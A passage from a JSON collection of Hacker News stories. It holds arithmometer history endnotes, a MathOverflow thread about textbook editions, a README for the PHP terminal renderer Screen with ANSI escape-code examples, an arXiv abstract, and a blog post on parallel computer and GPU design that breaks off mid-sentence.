constructed. An unknown number of examples from the early 1850s do not carry serial numbers. Nor is it clear that serial numbers were assigned in a continuous sequence. Such issues will only be clarified when a more comprehensive survey of surviving machines has been carried out.\n\n39. G.-A. Hirn, ‘Notice sur l’utilité de l’arithmomètre et de l’hydrostat’, Annales du Génie Civil, 2nd part, 2 (1863), 113-7, 152-64.\n40. This fear had been expressed by the Royal Academy of Sciences in Madrid, whose report on the arithmometer had worried about the social consequences of the machine’s widespread adoption. Thomas once more relied on the journal Cosmos, presumably in the person of the abbé Moigno, to vigorously rebut this view: Cosmos, 5 (1854), pp. 660-1.\n\n41. Earlier reports had already concluded that the arithmometer had an important place alongside rather than as a replacement for existing technologies such as slide rules and logarithmic tables. See, for example, Lemoyne (note 27), esp. pp. 320-3.\n42. Lemoyne (note 27), p. 329 had already considered that, if 10,000 examples were to be commissioned, the machine could be built for less than 100 francs, instead of its then current price of 300. Hirn’s half-price comment was later repeated in Sebert (note 3), p. 707.\n43. Francoeur (note 6), p. 661 and Lemoyne (note 27), p. 329.\n44. In 1856 the arithmometer was included among the recommended specialities advertised on the inner leaves of Cosmos. 10-figure machines (5x0x10) were priced at 250fr, and [page 21:] 16-figures (8x0x16) at 500fr. Franz Reuleaux (note 51, p. 40) complained of the high price of the machine in 1862 but the prices he quotes are significantly less than in 1856: the same 10 and 16-figure machines were now only 150fr and 300fr respectively. Additional models were also available to Reuleaux, though the most expensive was still only 400fr.\n45. Francoeur (note 6), p. 661.\n46. Joly (note 5), pp. 130-1.\n47. Instruction pour se servir de l’arithmomètre (Paris, 1865). Copy with arithmometer in Národní technické muzeum, Prague, inv. no. 6337. The 1852 booklet (note 10) mentions only Benoît, who produced the 1851 report on the arithmometer for the Société d’encouragement. Sebert’s report of 1878 provides some additional names (note 3), p. 707.\n48. Reproduction included with entry for inv. M559 in the loose-leaf catalogue of the Brunsviga collection (copy in Mathematics Collection files at Science Museum, London).\n49. [Exposition Universelle de 1862 à Londres], Section Française: Catalogue Officiel (Paris, 1862), p. 109 and Sebert (note 3), p. 704.\n50. Dinglers polytechnisches Journal, 11 (1823), p. 121f., cited by von Mackensen (note 38), p. 100.\n51. Franz Reuleaux, Die Thomas’sche Rechenmaschine (Freiberg, 1862). The pamphlet was extracted from Reuleaux’s article in Der Civilingenieur, 8 (1862). The piece was also republished in Dinglers polytechnisches Journal, 165 (1862), 334-62 and a second edition appeared in 1892.\n52. Petzold (note 4), p. 106. For the use of the arithmometer in trigonometrical tabulations, see August Junge, Tafel der wirklichen Länge der Sinus und Cosinus (Leipzig, 1864), preface.\n53. Peggy Aldrich Kidwell, ‘American scientists and calculating machines – from novelty to commonplace’, Annals of the History of Computing, 12 (1990), 31-40, pp. 32-4.\n54. Report of the Twenty-Fourth Meeting of the British Association for the Advancement of Science; held at Liverpool in September 1854 (London, 1855), ‘Notices and abstracts of miscellaneous communications to the sections’, pp. 1-2 and Cosmos, 5 (1854), pp. 463-4.\n55. In the discussion following C.V. Boys, ‘Calculating machines’, Journal of the Society of Arts, 34 (1886), p. 387, Thomas Ackland mentioned that he had bought a Thomas machine in 1851.\n56. Copy in Mathematics Collection Technical File inv. 1980-1779, Science Museum, London. The leaflet can be dated to either 1872 or 1873 from its reference to an as-yet-unpublished paper given at the Society of Telegraph Engineers (discussed below). I shall refer to it as the ‘1872 list’.\n57. Brunel to Adams, 18 March 1866, Bristol University Library, Brunel Collection, Letter Book VII, f. 106 (hereafter Brunel Collection).\n58. Brunel to J. Dobson, esq., 27 March 1866, Brunel Collection, VII, f. 15.\n59. Brunel to de Fontaine Moreau, 13 July 1868, Brunel Collection, IX, f. 115.\n60. Brunel to Froude, 31 May 1866, Brunel Collection, VII, f. 157.\n61. Brunel to L. de Fontaine Moreau, 26 November 1867, Brunel Collection, VIII, f. 326. Brunel wrote to Froude about the arrangement on the same day; ibid., f. 322.\n62. Brunel to Gamble, 14 June 1868, Brunel Collection, IX, f. 99.\n63. Brunel to L. [de] Fontaine Moreau, 10 June 1868, Brunel Collection, IX, f. 97.\n64. Brunel to de Fontaine Moreau, 13 July 1868, Brunel Collection, IX, ff. 114-5.\n65. Brunel to Captain Noble, 10 March 1869, Brunel Collection, IX, f. 237. The 1872 list is apparently mistaken in assigning Captain Noble to the Postal Telegraph Offices. Brunel addressed Noble at Armstrong’s Elswick Works at Newcastle; on Noble see David J. Jeremy, Dictionary of Business Biography, 5 vols (London, 1984-5), IV, pp. 444-6. For Adie, see Brunel to Adie, 28 December 1868, Brunel Collection, IX, f. 169 and 11 March 1869, Brunel Collection, IX, f. 236. Adie is Patrick Adie, who began a London offshoot of his father’s Edinburgh business in 1844: T.N. Clarke, A.D. Morrison-Low, A.D.C. Simpson, Brass & Glass (Edinburgh, 1989), pp. 75-84.\n66. Brunel to Captain Noble, 29 April 1869, Brunel Collection, IX, f. 284.\n67. Science Museum, Mathematics Collection, inv. 1868-1. The machine is engraved ‘S. & A. D. S.K. MUS.’ Kevin Johnson kindly confirmed from the museum archives that the machine was bought in Paris on 11 January 1868 for £16.\n68. Transactions of the Devonshire Association for the Advancement of Science, Literature and the Arts, 7 (1875), p. 174. I owe this reference to Jackie Britton. The Cambridge Observatory was listed as a purchaser in the 1865 edition of the instruction manual (note 47).\n69. For Bashforth, see Dictionary of National Biography, 1912-1921, pp. 35-6. The reference to the arithmometer appears in his Supplement to a Mathematical Treatise on the Motion of Projectiles (London, 1881), p. 126.\n70. Andrew Warwick, ‘The laboratory of theory, or what’s exact about the exact sciences?’, in M. Norton Wise (ed.), The Values of Precision (Princeton, 1995), 311-351, pp. 329-31.\n71. Cited by Martin Campbell-Kelly, ‘Large-scale data processing in the Prudential, 1850-1930’, Accounting, Business and Financial History, 2 (1992), 117-139, p. 123.\n72. Prudential Assurance Company, Calculating Machine Papers. Prudential-owned arithmometers from the 1870s still survive: see figure 1.28 in Williams (note 1), p. 50.\n73. Henry Harben in the discussion to Thomas T.P. Bruce Warren, ‘On the application of the calculating machine of M. Thomas de Colmar to electrical computations’, Journal of the Society of Telegraph Engineers, 1 (1872), p. 165.\n74. For the Times letter, see Campbell-Kelly (note 71), pp. 127-8. Payment is recorded in the Prudential Assurance Company Board Minutes, 19 January 1882. Several arithmometers signed by Elliott Brothers survive, for example, Science Museum, London, Mathematics Collection, inv. 1989-636.\n75. On this engine, see Lindgren (note 1), pp. 211-35. Note that Donkin’s name appears on the 1872 arithmometer list.\n76. Public Record Office (PRO), RG/29/2/111, 29 January 1870. I am indebted to Doron Swade for providing me with transcripts of this and other Treasury-GRO documents.\n77. PRO RG29/2/162, 28 July 1873.\n78. PRO RG29/6/109, 5 August 1873. On Sandford and his career in the Education Department, see the Dictionary of National Biography.\n79. PRO RG29/2/250, 16 March 1877.\n80. PRO RG29/3/129 and RG29/7/80 from 1893 and cf. Boys’s paper (note 55) which compares English arithmometers with the inferior workmanship of the Thomas machine.\n81. Warren (note 73). The paper is pp. 141-164 and the discussion appears at pp. 164-8. Warren was electrician to Hooper’s Telegraph Works, who appear in the 1872 list.\n82. Stan Augarten, Bit by Bit: an Illustrated History of Computers (London, 1984), pp. 37-8.\n83. Cf. Hirn (note 39), p. 113 on the machine’s relative lack of profitability.\n84. Jacomy-Régnier, Histoire des nombres et de la numération mécanique (Paris, 1855), pp. 28, 58, 68.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "137daba2ec570893",
    "title": {
      "en": "Older editions of which books were better than the new ones?",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://mathoverflow.net/questions/29710/older-editions-of-which-books-were-better-than-the-new-ones",
    "score": 6,
    "by": "susam",
    "time": 1742678499,
    "content": "Older editions of which books were better than the new ones? [closed]\n\n        Ask Question\n\n                        Asked\n                        14 years, 9 months ago\n\n                        Modified\n                        14 years, 9 months ago\n\n                        Viewed\n                        4k times\n\n        This question shows research effort; it is useful and clear\n\n5\n\nSave this question.\n\n    Show activity on this post.\n\n    \\begingroup\n\n                                As it currently stands, this question is not a good fit for our Q&A format. We expect answers to be supported by facts, references, or expertise, but this question will likely solicit debate, arguments, polling, or extended discussion. If you feel that this question can be improved and possibly reopened, visit the help center for guidance.\n\n                Closed 14 years ago.\n\nWhen choosing some mathematics book to study, is it always the case that one should look for the current edition of the book. Are there any examples when the older edition of some book is clearly better than the latest version?\n\n                    booksbig-list\n\n            ShareShare a link to this question Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this question\n\n                        Follow\n\n                    Follow this question to receive notifications\n\n            asked Jun 27, 2010 at 14:30\n\n            community wiki\n\n        user2242\n\n    \\endgroup\n\n            4\n\n                \\begingroup\n                I'd be curious what anyone has to say about Fulton's Algebraic Curves.  It seems to me that earlier versions cover considerably more material than the current version, which is pretty streamlined.\n                \\endgroup\n\n–Qiaochu Yuan\n\n                    Commented\n                    Jun 27, 2010 at 17:10\n\n                    1\n\n                \\begingroup\n                This question now has a meta thread - tea.mathoverflow.net/discussion/476/…\n                \\endgroup\n\n–François G. Dorais\n\n                    Commented\n                    Jun 27, 2010 at 17:17\n\n                    1\n\n                \\begingroup\n                How do I vote to reopen this question? I think it is very useful to know (and not at all subjective) when a new edition omits sections of the old, changes notation, introduces new errors, etc.\n                \\endgroup\n\n–John Stillwell\n\n                    Commented\n                    Jun 27, 2010 at 23:24\n\n                \\begingroup\n                John, I've copied your comment to the meta discussion.\n                \\endgroup\n\n–Victor Protsak\n\n                    Commented\n                    Jun 28, 2010 at 10:48\n\n                        Add a comment\n                    |\n\n                                        4 Answers\n                                    4\n\n            Sorted by:\n\n            Reset to default\n\n                        Highest score (default)\n\n                        Date modified (newest first)\n\n                        Date created (oldest first)\n\n        This answer is useful\n\n8\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nUsually a newer edition is something that at least the author and publisher considered an improvement, so any answers are rather subjective. That said,\n\nIan Stewart's Galois Theory, 3rd edition, is sometimes harshly criticized for ruining a great book, by (1) doing everything over the complex numbers first (leading to some long-winded proofs), and (2) being full of typos. The former is a conscious choice of the author, so its merits are debatable, but at any rate it's a substantially different book from the 2nd edition.\nCalculus Made Easy, by Silvanus P. Thompson. This 1910 classic was updated in 1998 by Martin Gardner, but because both the authors are \"men of strong individuality\", the difference in styles can be somewhat jarring. Also, John Baez complains that:\n\n  Alas, the new edition has been puffed up to 336 pages by Martin Gardener. People must want calculus to seem hard.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 16:59\n\n            community wiki\n\n        shreevatsa\n\n    \\endgroup\n\n                3\n\n                    1\n\n                \\begingroup\n                Stewart's Galois Theory was the first book that came to my mind when I saw the question, and for exactly the reasons stated.\n                \\endgroup\n\n–Gerry Myerson\n\n                    Commented\n                    Jun 27, 2010 at 23:26\n\n                    2\n\n                \\begingroup\n                What about the Galois Theory 4th edition (2015)? Better or worse?\n                \\endgroup\n\n–user94750\n\n                    Commented\n                    Nov 11, 2018 at 2:25\n\n                \\begingroup\n                @KennyLJ sorry, I don't know\n                \\endgroup\n\n–shreevatsa\n\n                    Commented\n                    Nov 11, 2018 at 2:43\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n5\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nHausdorff's book Mengenlehre in the first edition had an appendix, omitted in subsequent editions,  on the Banach paradox.  (Later made into the Banach-Tarski paradox by Tarski...)  Someone once told me this was the best, most elementary, presentation of it -- I haven't compared different versions of the proof myself.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 18:27\n\n            community wiki\n\n        Gerald Edgar\n\n    \\endgroup\n\n                1\n\n                    1\n\n                \\begingroup\n                Strictly speaking, it's the Hausdorff paradox in the first edition of Mengenlehre (the one about the sphere, rather than the ball). I wouldn't say that it's technically the simplest presentation, because it uses the modular group rather than a free group, but still it is a big disappointment that it was omitted from later editions.\n                \\endgroup\n\n–John Stillwell\n\n                    Commented\n                    Jun 28, 2010 at 0:18\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n2\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nIan Stewart, Galois theory.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 14:48\n\n        RandomblueRandomblue\n\n            2,97777 gold badges3535 silver badges3838 bronze badges\n\n    \\endgroup\n\n                2\n\n                    3\n\n                \\begingroup\n                Any chance you could elaborate on why the older edition is better?\n                \\endgroup\n\n–Charles Siegel\n\n                    Commented\n                    Jun 27, 2010 at 15:08\n\n                \\begingroup\n                @CharlesSiegel Personally, when I was studying Galois theory, I found the second edition better because it matched my course. We did things over fields of any characteristic, not just characteristic 000, which is what the third edition focuses on. On the one hand a lot of examples were from polynomials over QQ\\Bbb Q, but you actually miss out on what strange things can happen over finite fields if you don't consider them. While the end goal might be to look at solubility by radicals, it doesn't hurt to state things over a general field, except possibly to modify a proof or two.\n                \\endgroup\n\n–snulty\n\n                    Commented\n                    Jul 1, 2016 at 12:32\n\n                        Add a comment\n                    |\n\n        This answer is useful\n\n1\n\nSave this answer.\n\n    Show activity on this post.\n\n    \\begingroup\n\nThis kind of thing is very subjective, but in my opinion the third edition of Computability and Logic by Boolos and Jeffrey is better than the fourth, at least from the point of view of someone interested in the advanced topics (as opposed to a student encountering the material for the first time).  Some of the more interesting advanced topics were cut from the fourth edition.\n\n            ShareShare a link to this answer Copy linkCC BY-SA 2.5\n\n                Cite\n\n                        Improve this answer\n\n                        Follow\n\n                    Follow this answer to receive notifications\n\n            answered Jun 27, 2010 at 17:35\n\n            community wiki\n\n        Timothy Chow\n\n    \\endgroup\n\n                1\n\n                \\begingroup\n                The fourth edition had acquired a new author....\n                \\endgroup\n\n–Robin Chapman\n\n                    Commented\n                    Jun 27, 2010 at 17:51\n\n                        Add a comment\n                    |\n\n                                        Start asking to get answers\n                                        Find the answer to your question by asking.\n                                        Ask question\n\n                                        Explore related questions\n                                        booksbig-list\n                                        See similar questions with these tags.\n\n                            Featured on Meta\n\n                Experimenting with a new experiment opt-out option\n\n                Community Asks Sprint Announcement - March 2025\n\n                How might Chat evolve? Help us identify problems and opportunities\n\n            Related\n\n                            86\n\n                        Books about history of recent mathematics\n\n                            14\n\n                        Suggestions for mathematics encyclopedia\n\n                            22\n\n                        What classification theorems have been improved by re-categorizing?\n\n                            91\n\n                        Old books still used\n\n                            22\n\n                        Papers better than books?\n\n                            58\n\n                        What are examples of books which teach the practice of mathematics?\n\n                            15\n\n                        Learning mathematics in an \"independent and idiosyncratic\" way\n\n                            5\n\n                        Springer GTM Series statement of purpose (early editions)\n\n                 $(function() {\n                     $(\".js-gps-related-questions .spacer\").on(\"click\", function () {\n                        fireRelatedEvent($(this).index() + 1, $(this).data('question-id'));\n                     });\n\n                 function fireRelatedEvent(position, questionId) {\n                     StackExchange.using(\"gps\", function() {\n                         StackExchange.gps.track('related_questions.click',\n                         {\n                             position: position,\n                             originQuestionId: 29710,\n                             relatedQuestionId: +questionId,\n                             location: 'sidebar',\n                             source: 'Baseline'\n                         });\n                     });\n                 }\n             });\n\nStackExchange.ready(function(){$.get('/posts/29710/ivc/6251?prg=915924eb-793f-4fd8-891c-185381f87775');});\n<div><img src=\"/posts/29710/ivc/6251?prg=915924eb-793f-4fd8-891c-185381f87775\" class=\"dno\" alt=\"\" width=\"0\" height=\"0\"></div>\n\n{\"doMarkObsolete\":false,\"doTimeOnPage\":false,\"sendAnswerEditorEventsToAEH\":false,\"sendAnswerEditorEventsToPrizm\":false,\"questionId\":29710,\"sendAuthQuestionVisitToAEH\":false,\"sendAuthQuestionVisitToPrizm\":false}",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "98e60ae8c2214936",
    "title": {
      "en": "Math for Computer Science and Machine Learning [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cis.upenn.edu/~jean/math-deep.pdf",
    "score": 39,
    "by": "ibobev",
    "time": 1742636557,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "22d55cc5566c84c7",
    "title": {
      "en": "Show HN: A terminal emulator in pure PHP",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/soloterm/screen",
    "score": 182,
    "by": "aarondf",
    "time": 1742579005,
    "content": "Solo Screen\nScreen is a terminal renderer written in pure PHP. It powers Solo for Laravel and\ncan be used to build rich text-based user interfaces in any PHP application.\nNoteScreen is a library intended to be integrated into PHP applications. It is not a standalone terminal application.\n\nAbout terminal renderers\nA terminal renderer processes text and ANSI escape sequences to create a virtual representation of terminal output.\nUnlike a full terminal emulator, Screen focuses specifically on correctly interpreting and rendering text content with\nformatting rather than handling input, interactive sessions, or process management.\nTerminal renderers interpret escape sequences to:\n\nTrack cursor position\nApply text colors and styles (bold, underline, etc.)\nManage screen content\nHandle special character sets\nGenerate a final rendered output\n\nScreen implements this functionality in pure PHP, allowing developers to build terminal user interfaces without relying\non external dependencies or native code.\nWhy this exists\nScreen was originally created to solve a specific problem in Solo for Laravel.\nSolo provides a TUI (Text User Interface) that runs multiple processes simultaneously in separate panels, similar to\ntmux. However, when these processes output ANSI escape codes for cursor movement and screen manipulation, they could\npotentially \"break out\" of their visual containers and interfere with other parts of the interface.\nTo solve this problem, Screen creates a virtual terminal buffer where:\n\nAll ANSI operations (cursor movements, color changes, screen clears) are safely interpreted within an isolated\nenvironment\nThe final rendered state is captured after all operations are processed\nOnly the final visual output is displayed to the user's terminal\n\nThis approach provides complete control over how terminal output is rendered, ensuring that complex ANSI operations stay\ncontained within their designated areas. While initially built for Solo, Screen has evolved into a standalone library\nthat can be used in any PHP application requiring terminal rendering.\nFeatures\n\nPure PHP Implementation: Only one dependency (Grapheme, another Solo\nlibrary)\nComprehensive ANSI Support: Handles cursor positioning, text styling, and screen manipulation\nUnicode/Multibyte Support: Properly handles UTF-8 characters including emojis and wide characters\nBuffer Management: Maintains separate buffers for text content and styling\nCharacter Width Handling: Correctly calculates display width for CJK and other double-width characters\nScrolling: Support for vertical scrolling with proper content management\n\nInstallation\nInstall via Composer:\ncomposer require soloterm/screen\n\nRequirements\n\nPHP 8.1 or higher\nmbstring extension\n\nBasic usage\nHere's a simple example of using Screen:\nuse SoloTerm\\Screen\\Screen;\n\n// Create a screen with dimensions (columns, rows)\n$screen = new Screen(80, 24);\n\n// Write text and ANSI escape sequences\n$screen->write(\"Hello, \\e[1;32mWorld!\\e[0m\");\n\n// Move cursor and add more text\n$screen->write(\"\\e[5;10HPositioned text\");\n\n// Get the rendered content\necho $screen->output();\n\nCore concepts\nScreen operates with several key components:\nScreen\nThe main class that coordinates all functionality. It takes care of cursor positioning, content writing, and rendering\nthe final output.\n$screen = new Screen(80, 24); // width, height\n$screen->write(\"Text and ANSI codes\");\n\nBuffers\nScreen uses multiple buffer types to track content and styling:\n\nPrintableBuffer: Stores visible characters and handles width calculations\nAnsiBuffer: Tracks styling information (colors, bold, underline, etc.)\n\nANSI processing\nScreen correctly interprets ANSI escape sequences for:\n\nCursor movement (up, down, left, right, absolute positioning)\nText styling (colors, bold, italic, underline)\nScreen clearing and line manipulation\nScrolling\n\nAdvanced features\nCursor positioning\n// Move cursor to position (row 5, column 10)\n$screen->write(\"\\e[5;10H\");\n\n// Move cursor up 3 lines\n$screen->write(\"\\e[3A\");\n\n// Save and restore cursor position\n$screen->write(\"\\e7\"); // Save\n$screen->write(\"More text\");\n$screen->write(\"\\e8\"); // Restore\n\nText styling\n// Bold red text\n$screen->write(\"\\e[1;31mImportant message\\e[0m\");\n\n// Background colors\n$screen->write(\"\\e[44mBlue background\\e[0m\");\n\n// 256-color support\n$screen->write(\"\\e[38;5;208mOrange text\\e[0m\");\n\n// RGB colors\n$screen->write(\"\\e[38;2;255;100;0mCustom color\\e[0m\");\n\nScreen manipulation\n// Clear screen\n$screen->write(\"\\e[2J\");\n\n// Clear from cursor to end of line\n$screen->write(\"\\e[0K\");\n\n// Insert lines\n$screen->write(\"\\e[2L\");\n\n// Scroll up\n$screen->write(\"\\e[2S\");\n\nCustom integrations\nYou can respond to terminal queries by setting a callback:\n$screen->respondToQueriesVia(function($response) {\n    // Process response (like cursor position)\n    echo $response;\n});\n\nNoteThis is still a work in progress. We need some more tests / use cases here.\n\nExample: building a simple UI\nuse SoloTerm\\Screen\\Screen;\n\n$screen = new Screen(80, 24);\n\n// Draw a border\n$screen->write(\"┌\" . str_repeat(\"─\", 78) . \"┐\\n\");\nfor ($i = 0; $i < 22; $i++) {\n    $screen->write(\"│\" . str_repeat(\" \", 78) . \"│\\n\");\n}\n$screen->write(\"└\" . str_repeat(\"─\", 78) . \"┘\");\n\n// Add a title\n$screen->write(\"\\e[1;30H\\e[1;36mMy Application\\e[0m\");\n\n// Add some content\n$screen->write(\"\\e[5;5HWelcome to the application!\");\n$screen->write(\"\\e[7;5HPress 'q' to quit.\");\n\n// Render\necho $screen->output();\n\nHandling unicode and wide characters\nScreen properly handles Unicode characters including emoji and CJK characters that take up multiple columns:\n$screen->write(\"Regular text: Hello\");\n$screen->write(\"\\nWide characters: 你好世界\");\n$screen->write(\"\\nEmoji: 🚀 👨‍👩‍👧‍👦 🌍\");\n\nTesting\nScreen includes a comprehensive testing suite that features a unique visual comparison system:\ncomposer test\n\nVisual testing\nScreen employs an innovative screenshot-based testing approach (see ComparesVisually trait) that validates the visual\noutput:\n\nThe test renders content in a real terminal (iTerm)\nIt captures a screenshot of the terminal output\nIt runs the same content through the Screen renderer\nIt captures a screenshot of the rendered output\nIt compares the screenshots pixel-by-pixel to ensure accuracy\n\nThis testing strategy ensures that Screen's rendering accurately matches real terminal behavior, especially for complex\nscenarios involving:\n\nMulti-byte characters\nComplex ANSI formatting\nCursor movements\nScrolling behavior\nLine wrapping\n\nFor environments without screenshot capabilities, tests can fall back to fixture-based comparison, making the test suite\nversatile for CI/CD pipelines.\nTo enable screenshots for all tests, use the following command:\nENABLE_SCREENSHOT_TESTING=1 composer test\n\nTo enable screenshots for only the tests that don't already have fixtures, use the following command:\nENABLE_SCREENSHOT_TESTING=2 composer test\n\nContributing\nContributions are welcome! Please feel free to submit a pull request.\nLicense\nThe MIT License (MIT).\nSupport\nThis is free! If you want to support me:\n\nSponsor my open source work: aaronfrancis.com/backstage\nCheck out my courses:\n\nMastering Postgres\nHigh Performance SQLite\nScreencasting\n\nHelp spread the word about things I make\n\nCredits\nSolo Screen was developed by Aaron Francis. If you like it, please let me know!\n\nTwitter: https://twitter.com/aarondfrancis\nWebsite: https://aaronfrancis.com\nYouTube: https://youtube.com/@aarondfrancis\nGitHub: https://github.com/aarondfrancis",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "8b7b54a1406f7565",
    "title": {
      "en": "Most AI value will come from broad automation, not from R&D",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://epoch.ai/gradient-updates/most-ai-value-will-come-from-broad-automation-not-from-r-d",
    "score": 80,
    "by": "ydnyshhh",
    "time": 1742668500,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9e0fba41c956e10b",
    "title": {
      "en": "Pen and Paper Exercises in Machine Learning (2022)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arxiv.org/abs/2206.13446",
    "score": 394,
    "by": "ibobev",
    "time": 1742587632,
    "content": "This is a collection of (mostly) pen-and-paper exercises in machine learning. The exercises are on the following topics: linear algebra, optimisation, directed graphical models, undirected graphical models, expressive power of graphical models, factor graphs and message passing, inference for hidden Markov models, model-based learning (including ICA and unnormalised models), sampling and Monte-Carlo integration, and variational inference.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "60e5facc16b537eb",
    "title": {
      "en": "I want a good parallel computer",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://raphlinus.github.io/gpu/2025/03/21/good-parallel-computer.html",
    "score": 190,
    "by": "raphlinus",
    "time": 1742586942,
    "content": "I want a good parallel computer\n\n      Mar 21, 2025\n\n    The GPU in your computer is about 10 to 100 times more powerful than the CPU, depending on workload. For real-time graphics rendering and machine learning, you are enjoying that power, and doing those workloads on a CPU is not viable. Why aren’t we exploiting that power for other workloads? What prevents a GPU from being a more general purpose computer?\n\nI believe there are two main things holding it back. One is an impoverished execution model, which makes certain tasks difficult or impossible to do efficiently; GPUs excel at big blocks of data with predictable shape, such as dense matrix multiplication, but struggle when the workload is dynamic. Second, our languages and tools are inadequate. Programming a parallel computer is just a lot harder.\n\nModern GPUs are also extremely complex, and getting more so rapidly. New features such as mesh shaders and work graphs are two steps forward one step back; for each new capability there is a basic task that isn’t fully supported.\n\nI believe a simpler, more powerful parallel computer is possible, and that there are signs in the historical record. In a slightly alternate universe, we would have those computers now, and be doing the work of designing algorithms and writing programs to run well on them, for a very broad range of tasks.\n\nLast April, I gave a colloquium (video) at the UCSC CSE program with the same title. This blog is a companion to that.\n\nMemory efficiency of sophisticated GPU programs\n\nI’ve been working on Vello, an advanced 2D vector graphics renderer, for many years. The CPU uploads a scene description in a simplified binary SVG-like format, then the compute shaders take care of the rest, producing a 2D rendered image at the end. The compute shaders parse tree structures, do advanced computational geometry for stroke expansion, and sorting-like algorithms for binning. Internally, it’s essentially a simple compiler, producing a separate optimized byte-code like program for each 16x16 pixel tile, then interpreting those programs. What it cannot do, a problem I am increasingly frustrated by, is run in bounded memory. Each stage produces intermediate data structures, and the number and size of these structures depends on the input in an unpredictable way. For example, changing a single transform in the encoded scene can result in profoundly different rendering plans.\n\nThe problem is that the buffers for the intermediate results need to be allocated (under CPU control) before kicking off the pipeline. There are a number of imperfect potential solutions. We could estimate memory requirements on the CPU before starting a render, but that’s expensive and may not be precise, resulting either in failure or waste. We could try a render, detect failure, and retry if buffers were exceeded, but doing readback from GPU to CPU is a big performance problem, and creates a significant architectural burden on other engines we’d interface with.\n\nThe details of the specific problem are interesting but beyond the scope of this blog post. The interested reader is directed to the Potato design document, which explores the question of how far you can get doing scheduling on CPU, respecting bounded GPU resources, while using the GPU for actual pixel wrangling. It also touches on several more recent extensions to the standard GPU execution model, all of which are complex and non-portable, and none of which quite seem to solve the problem.\n\nFundamentally, it shouldn’t be necessary to allocate large buffers to store intermediate results. Since they will be consumed by downstream stages, it’s far more efficient to put them in queues, sized large enough to keep enough items in flight to exploit available parallelism. Many GPU operations internally work as queues (the standard vertex shader / fragment shader / rasterop pipeline being the classic example), so it’s a question of exposing that underlying functionality to applications. The GRAMPS paper from 2009 suggests this direction, as did the Brook project, a predecessor to CUDA.\n\nThere are a lot of potential solutions to running Vello-like algorithms in bounded memory; most have a fatal flaw on hardware today. It’s interesting to speculate about changes that would unlock the capability. It’s worth emphasizing, I’m not feeling held back by the amount of parallelism I can exploit, as my approach of breaking the problem into variants of prefix sum easily scales to hundreds of thousands of threads. Rather, it’s the inability to organize the overall as stages operating in parallel, connected through queues tuned to use only the amount of buffer memory needed to keep everything smoothly, as opposed to the compute shader execution model of large dispatches separated by pipeline barriers.\n\nParallel computers of the past\n\nThe lack of a good parallel computer today is especially frustrating because there were some promising designs in the past, which failed to catch on for various complex reasons, leaving us with overly complex and limited GPUs, and extremely limited, though efficient, AI accelerators.\n\nConnection Machine\n\nI’m listing this not because it’s a particularly promising design, but because it expressed the dream of a good parallel computer in the clearest way. The first Connection Machine shipped in 1985, and contained up to 64k processors, connected in a hypercube network. The number of individual threads is large even by today’s standards, though each individual processor was extremely underpowered.\n\nPerhaps more than anything else, the CM spurred tremendous research into parallel algorithms. The pioneering work by Blelloch on prefix sum was largely done on the Connection Machine, and I find early paper on sorting on CM-2 to be quite fascinating.\n\nConnection Machine 1 (1985) at KIT / Informatics / TECO • by KIT TECO • CC0\n\nCell\n\nAnother important pioneering parallel computer was Cell, which shipped as part of the PlayStation 3 in 2006. That device shipped in fairly good volume (about 87.4 million units), and had fascinating applications including high performance computing, but was a dead end; the Playstation 4 switched to a fairly vanilla rendering pipeline based on a Radeon GPU.\n\nProbably one of the biggest challenges in the Cell was the programming model. In the version shipped on the PS3, there were 8 parallel cores, each with 256kB of static RAM, and each with 128 bit wide vector SIMD. The programmer had to manually copy data into local SRAM, where a kernel would then do some computation. There was little or no support for high level programming; thus people wanting to target this platform had to painstakingly architect and implement parallel algorithms.\n\nAll that said, the Cell basically met my requirements for a “good parallel computer.” The individual cores could run effectively arbitrary programs, and there was a global job queue.\n\nThe Cell had approximately 200 GFLOPS of total throughput, which was impressive at the time, but pales in comparison to modern GPUs or even a modern CPU (Intel i9-13900K is approximately 850 GFLOPS, with a medium-high end Ryzen 7 is 3379 GFLOPS).\n\nLarrabee\n\nPerhaps the most poignant road not taken in the history of GPU design is Larrabee. The 2008 SIGGRAPH paper makes a compelling case, but ultimately the project failed. It’s hard to say why exactly, but I think it’s possible it was just poor execution on Intel’s part, and with more persistence and a couple of iterations to improve the shortcomings in the original version, it might well have succeeded. At heart, Larrabee is a standard x86 computer with wide (512 bit) SIMD units and just a bit of special hardware to optimize graphics tasks. Most graphics functions are implemented in software. If it had succeeded, it would very easily fulfill my wishes; work creation and queuing is done in software and can be entirely dynamic at a fine level of granularity.\n\nBits of Larrabee live on. The upcoming AVX10 instruction set is an evolution of Larrabee’s AVX-512, and supports 32 lanes of f16 operations. In fact, Tom Forsyth, one of its creators, argues that Larrabee did not indeed fail but that its legacy is a success. It did ship in modest volumes as Xeon 